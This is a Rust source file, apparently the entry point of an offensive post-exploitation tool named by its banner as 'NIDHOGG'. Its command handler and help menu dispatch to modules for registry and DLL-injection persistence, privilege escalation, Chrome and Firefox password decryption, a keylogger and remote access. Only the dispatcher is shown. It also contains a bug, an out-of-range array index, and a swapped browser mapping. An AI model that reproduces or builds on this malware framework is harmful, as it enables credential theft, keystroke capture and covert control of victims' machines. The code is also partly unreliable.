pub mod remacc;
pub mod privesc;
pub mod persis;
pub mod exfil;
use std::time::{SystemTime};
use std::io::Write;
use std::process;

fn main (){
    banner();
    loop {
        let input=prompt("#> ");
        if input=="exit" { 
            break; 
        } else {
            cmd_handler(input);
        }
    }
}

fn banner(){
    let banner: &str = "                                                 
    ::::    ::: ::::::::::: :::::::::  :::    :::  ::::::::   ::::::::   ::::::::  
    :+:+:   :+:     :+:     :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+: 
    :+:+:+  +:+     +:+     +:+    +:+ +:+    +:+ +:+    +:+ +:+        +:+        
    +#+ +:+ +#+     +#+     +#+    +:+ +#++:++#++ +#+    +:+ :#:        :#:        
    +#+  +#+#+#     +#+     +#+    +#+ +#+    +#+ +#+    +#+ +#+   +#+# +#+   +#+# 
    #+#   #+#+#     #+#     #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#    #+# 
    ###    #### ########### #########  ###    ###  ########   ########   ########                                     
    ";
    println!("{}", banner);
}

fn prompt(name:&str) -> String {
    let mut line = String::new();
    print!("{}", name);
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut line).expect("Error: Could not read a line");
 
    return line.trim().to_string()
}

fn cmd_handler(cmd: String) {
    let mut cmds: [String; 32] = Default::default();
    let mods = [
        "help",
        "persis",
        "priv",
        "passws",
        "keys",
        "remacc"
    ];
    let presis_cmds = [
        "reg",
        "dll",
    ];
    let privesc_cmds = [
        "aie",
        "npi",
        "wsp",
    ];
    let exfil_cmds = [
    "chrome",
    "firefox",
    ];

    
    if cmd.contains(mods[0]) {
        help()

        
    } else if cmd.contains(mods[1]){
        if cmd.contains(presis_cmds[0]){
            persis::reg::run()
        } else if cmd.contains(presis_cmds[1]){
            persis::dll_inj::run()
        } else {
            println!("Invalid Persistence Option");
            persis::help()
        }


    } else if cmd.contains(mods[2]){
        if cmd.contains(privesc_cmds[0]){
            privesc::aie::aie_check()
        } else if cmd.contains(privesc_cmds[1]){
            privesc::npi::npi_check()
        } else if cmd.contains(privesc_cmds[2]){
            privesc::wsp::wsp_check()
        } else {
            println!("Invalid Priv Escalation Option");
            privesc::help()
        }


    } else if cmd.contains(mods[3]){
        if cmd.contains(exfil_cmds[2]){
            exfil::dec_ff::run()
        } else if cmd.contains(exfil_cmds[1]){
            exfil::dec_chrome::run()
        } else {
            println!("Invalid Exfil Option");
            exfil::help()
        }


    } else if cmd.contains(mods[4]){
        exfil::keys::start()


    } else if cmd.contains(mods[5]){
        remacc::remacc_init() 


    } else if cmd == "exit" {
        process::exit(0);


    } else {
        println!("Invalid Command");
        help()
    }
}

fn help(){
    let menu: &str = "
    
    COMMAND                     DESCRIPTION


    help                        Displays this menu

    persis                      Persistence Modules
            reg                     Establishes persistence using registry key
            dll                     Establishes persistence using dll injection
    
    priv                        Privilege Escalation Modules
            aie                     AIE Priv Escalation
            npi                     NPI Priv Escalation
            wsp                     WSP Priv Escalation
    
    passws                      Browser Password Decryption
            chrome                  Chrome Passwords
            firefox                 Firefox Passwords

    keys                        Start a keylogger
    
    remacc                      Remote Access Module
    
    exit                        Exits the program

    ";
    println!("{}", menu);
}
